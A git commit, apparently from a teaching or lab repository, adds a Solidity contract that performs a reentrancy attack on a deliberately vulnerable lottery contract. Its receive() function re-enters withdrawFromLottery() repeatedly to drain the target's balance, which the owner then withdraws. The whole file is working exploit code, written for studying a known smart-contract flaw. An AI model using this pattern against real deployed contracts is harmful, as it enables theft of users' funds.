bc63af961a962619f20f11d9e5da5eb8896303a4
nikola-vukic-alt <niola.vukic@uns.ac.rs>
2024-08-21 19:07:27 +0200

    reentrancy attack

---
+++ src/ReentrancyAttack.sol
@@ -0,0 +1,32 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import {Lottery} from "./VulnerableLottery.sol";
+
+contract ReentrancyAttack {
+    uint256 public constant PARITICIPATION_FEE = 1e16;
+
+    Lottery private s_target;
+    address private s_owner;
+
+    constructor(address targetAddress) {
+        s_owner = msg.sender;
+        s_target = Lottery(targetAddress);
+    }
+
+    function attack() external {
+        require(msg.sender == s_owner, "Unauthorized");
+        s_target.withdrawFromLottery();
+    }
+
+    function withdraw() external {
+        require(msg.sender == s_owner, "Unauthorized");
+        payable(s_owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        if (address(s_target).balance >= PARITICIPATION_FEE) {
+            s_target.withdrawFromLottery();
+        }
+    }
+}
